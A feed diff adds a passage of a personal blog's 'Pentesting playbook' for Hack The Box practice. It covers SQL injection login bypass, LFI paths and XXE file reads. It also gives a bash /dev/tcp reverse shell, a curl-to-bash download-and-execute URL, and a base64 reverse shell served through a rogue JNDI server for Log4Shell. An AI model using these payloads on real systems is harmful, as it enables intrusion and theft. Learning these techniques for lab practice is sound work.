@@ -1,4 +1,429 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2022-12-19T22:42:39+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Pentesting tools</title><link href="https://www.agalera.eu/pentesting-tools/" rel="alternate" type="text/html" title="Pentesting tools" /><published>2022-12-16T00:00:00+01:00</published><updated>2022-12-16T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-tools</id><content type="html" xml:base="https://www.agalera.eu/pentesting-tools/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the pentesting tools I am learning.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2022-12-26T13:51:12+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Pentesting playbook</title><link href="https://www.agalera.eu/pentesting-playbook/" rel="alternate" type="text/html" title="Pentesting playbook" /><published>2022-12-25T00:00:00+01:00</published><updated>2022-12-25T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-playbook</id><content type="html" xml:base="https://www.agalera.eu/pentesting-playbook/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the steps I take to complete the challenges.&lt;/p&gt;
+
+&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order):&lt;/p&gt;
+
+&lt;h2 id=&quot;table-of-contents&quot;&gt;Table of contents&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;#enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#breaking-in&quot;&gt;Breaking in&lt;/a&gt;
+    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#anonymous-access&quot;&gt;Poorly configured access&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#brute-force-user&quot;&gt;Brute force user/password&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#sql-injection&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssti&quot;&gt;Server-side template injection&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#arbitrary-file-upload&quot;&gt;Arbitrary file upload&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#lfi&quot;&gt;Local file inclusion&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#rfi&quot;&gt;Remote file inclusion&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot;&gt;Reverse shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#rogue&quot;&gt;Rogue servers&lt;/a&gt;
+        &lt;ol&gt;
+          &lt;li&gt;&lt;a href=&quot;#ntlm&quot;&gt;NTLM&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#log4j-shell&quot;&gt;Log4JShell&lt;/a&gt;&lt;/li&gt;
+        &lt;/ol&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#search-vuln&quot;&gt;Search for vulnerabilities&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#xxe&quot;&gt;XML eXternal Entities&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#foothold&quot;&gt;Foothold, we are in&lt;/a&gt;
+    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#list-users&quot;&gt;List users/group&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#search-keywords&quot;&gt;Search keywords&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#local-port-forwarding&quot;&gt;Local port forwarding&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#lateral-movement&quot;&gt;Lateral movement&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssh-keys&quot;&gt;Search for SSH keys&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot;&gt;Privilege escalation&lt;/a&gt;
+    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#privilege-escalation-windows&quot;&gt;Privilege escalation on Windows&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#privilege-escalation-linux&quot;&gt;Privilege escalation on Linux&lt;/a&gt;
+        &lt;ol&gt;
+          &lt;li&gt;&lt;a href=&quot;#privilege-escalation-suid&quot;&gt;Set owner User ID&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#privilege-escalation-app&quot;&gt;Abuse regular application&lt;/a&gt;&lt;/li&gt;
+        &lt;/ol&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;enumeration-&quot;&gt;Enumeration &lt;a name=&quot;enumeration&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; the attacker needs to see what is open in the target machine. For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;At this stage, we’ll behave like a legitimate user, e.g.: perform regular searches, etc…&lt;/p&gt;
+
+&lt;p&gt;If you discover a website, it’s interesting to test the following enumeration techniques:&lt;/p&gt;
+
+&lt;h4 id=&quot;directory-brute-force&quot;&gt;Directory brute force&lt;/h4&gt;
+
+&lt;p&gt;This is a technique useful to detect available paths for a web application. Also known as dir busting.&lt;/p&gt;
+
+&lt;p&gt;The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.&lt;/p&gt;
+
+&lt;p&gt;The tools to perform this is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Another option is to use sitemap functionality of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;burp&lt;/code&gt; suite&lt;/p&gt;
+
+&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;sub-domain-brute-force&quot;&gt;Sub-domain brute force&lt;/h4&gt;
+
+&lt;p&gt;This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server. You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; to perform this.&lt;/p&gt;
+
+&lt;h3 id=&quot;breaking-in-&quot;&gt;Breaking in &lt;a name=&quot;breaking-in&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine. At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to explot.&lt;/p&gt;
+
+&lt;p&gt;The attack vector is different to each machine, here you can find most common vector attacks:&lt;/p&gt;
+
+&lt;h4 id=&quot;poorly-configured-access-&quot;&gt;Poorly configured access &lt;a name=&quot;anonymous-access&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;The user might have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tftp&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; shares with anonymous access. It’s worth taking a look because those access might leak some valuable information. Additionally, you can also check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; to check for this kind of access.&lt;/p&gt;
+
+&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;brute-force-user-password-&quot;&gt;Brute force user password &lt;a name=&quot;brute-force-user&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;If you discover a login page, why not trying some default user/password combinations?. One thing to try is to search for the version of the software and query google for the default user/password.&lt;/p&gt;
+
+&lt;p&gt;Try the following user/password combinations first:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin:admin
+administrator:administrator
+admin:administrator
+admin:password
+administrator:password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Another option to try here is to try to brute force the user/password:&lt;/p&gt;
+
+&lt;p&gt;You can try a dictionary attack to bruce force user/password combinations.&lt;/p&gt;
+
+&lt;p&gt;You can use a tool like thc-hydra: &lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot;&gt;https://github.com/vanhauser-thc/thc-hydra&lt;/a&gt;. However, this will fail if there if there’s any kind of CSRF protection.&lt;/p&gt;
+
+&lt;p&gt;In order to bypass the CSRF protection, we must do the requests from the browser. I prepared a tool to do that:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/adriangalera/pydra/&quot;&gt;https://github.com/adriangalera/pydra/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Take into account that if you know for sure the user, it will take much less time than having to guess both user and password.&lt;/p&gt;
+
+&lt;h4 id=&quot;sql-injection-&quot;&gt;SQL Injection &lt;a name=&quot;sql-injection&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Poorly programmed queries can be very dangerous and leads to escaping issues in the queries. If you see any indications of a query, try to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap&lt;/code&gt; to identify potential SQL injections or try some very basic ones.&lt;/p&gt;
+
+&lt;p&gt;If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.&lt;/p&gt;
+
+&lt;p&gt;A typical SQL query for a login page can look like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; AND password = &apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kjdfjklsdf&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now the query becomes:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;therefore, the query is no longer checking for password and the login page is bypassed.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: admin&apos;#
+password: admin123 (any password will do the trick)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can find more SQL injections here: &lt;a href=&quot;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&quot;&gt;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;server-side-template-injection-&quot;&gt;Server side template injection &lt;a name=&quot;ssti&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.&lt;/p&gt;
+
+&lt;p&gt;If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.&lt;/p&gt;
+
+&lt;p&gt;One easy way to test that is to put something like {{7*7}} in the template and check for the result.&lt;/p&gt;
+
+&lt;p&gt;If the template executes, we’ll see the result, out of luck we will see nothing. Or maybe we’ll see some trace that reveals the technology behind.&lt;/p&gt;
+
+&lt;h4 id=&quot;arbitrary-file-upload-&quot;&gt;Arbitrary file upload &lt;a name=&quot;arbitrary-file-upload&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands if it was inside the machine.&lt;/p&gt;
+
+&lt;h4 id=&quot;local-file-include-lfi-&quot;&gt;Local File Include (LFI) &lt;a name=&quot;lfi&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Abuse of file loading capability (for instance PHP include function) to show a local file in the browser:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can try to read the following files for Linux:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/hosts
+/etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and for Windows:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:/Windows/System32/drivers/etc/hosts
+c:/windows/win.ini
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;remote-file-include-rfi-&quot;&gt;Remote File Include (RFI) &lt;a name=&quot;rfi&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.&lt;/p&gt;
+
+&lt;p&gt;This can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://unika.htb/index.php?page=\\10.1.2.3\blabla\
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;reverse-shell-&quot;&gt;Reverse shell &lt;a name=&quot;reverse-shell&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Reverse basically means that it is the target that will initiate a connection request back us (the attacker).&lt;/p&gt;
+
+&lt;p&gt;For example, once we have remote code execution in the target, we’ll be able to download and execute a piece of code.&lt;/p&gt;
+
+&lt;p&gt;Usually the process is:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Create a file in the attacker machine containing a reverse shell payload:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&amp;lt;YOUR_IP_ADDRESS&amp;gt;/1337 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Create a server in the attacker machine which will act as the shell I/O. Normally this is done with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt;.
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 1337
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Make the target machine download and execute the reverse shell payload:
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You can find a list of reverse shells here: &lt;a href=&quot;https://www.revshells.com/&quot;&gt;https://www.revshells.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Once you have shell access, you can try to get a improve the shell if python is installed:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;or&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;or&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;&lt;/span&gt;
+CTRL+Z
+&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;fg
+export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Or, you can find mmore methods to improve the shell here: &lt;a href=&quot;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&quot;&gt;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;rogue-servers-&quot;&gt;Rogue servers &lt;a name=&quot;rogue&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;The idea of rogue server is to start a server in the attacker machine and make the target machine speaks with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.&lt;/p&gt;
+
+&lt;h5 id=&quot;ntlm-&quot;&gt;NTLM &lt;a name=&quot;ntlm&quot;&gt;&lt;/a&gt;&lt;/h5&gt;
+
+&lt;p&gt;Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.&lt;/p&gt;
+
+&lt;p&gt;In order to mess with it, you might use the &lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;responder tool&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder&lt;/code&gt; tool). This tool will capture the authentication challenge hash and then you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; tool to compare the hash with a dictionary to see if any entry matches.&lt;/p&gt;
+
+&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h5 id=&quot;log4jshell-&quot;&gt;Log4jShell &lt;a name=&quot;log4j-shell&quot;&gt;&lt;/a&gt;&lt;/h5&gt;
+
+&lt;p&gt;It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from &lt;a href=&quot;https://github.com/veracode-research/rogue-jndi&quot;&gt;https://github.com/veracode-research/rogue-jndi&lt;/a&gt;in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.&lt;/p&gt;
+
+&lt;p&gt;E.g.:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; target/RogueJndi-1.1.jar &lt;span class=&quot;nt&quot;&gt;--command&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c
+{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-
+d}|{bash,-i}&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.14.33&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.&lt;/p&gt;
+
+&lt;p&gt;Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;search-for-vulnerabilities-&quot;&gt;Search for vulnerabilities &lt;a name=&quot;search-vuln&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;If you can establish the version of the service running, you can query for any known vulnerability of that version:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cve/search_cve_list.html&quot;&gt;https://cve.mitre.org/cve/search_cve_list.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;xml-external-entities-&quot;&gt;XML eXternal Entities &lt;a name=&quot;xxe&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.&lt;/p&gt;
+
+&lt;p&gt;This attack works because the XML parser usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.&lt;/p&gt;
+
+&lt;p&gt;In order to check if the machine is vulnerable to this attack, you can try to show the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;(Linux) or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:/Windows/System32/drivers/etc/hosts&lt;/code&gt;(Windows). e.g.:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version = &quot;1.0&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;order&amp;gt;&amp;lt;quantity&amp;gt;&lt;/span&gt;2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/quantity&amp;gt;&amp;lt;item&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/item&amp;gt;&amp;lt;address&amp;gt;&lt;/span&gt;Fake street 1234&lt;span class=&quot;nt&quot;&gt;&amp;lt;/address&amp;gt;&amp;lt;/order&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;foothold-we-are-in-&quot;&gt;Foothold, we are in &lt;a name=&quot;foothold&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;At this point we have shell (or reverse) access to the target machine. We can start to do some interesting stuff:&lt;/p&gt;
+
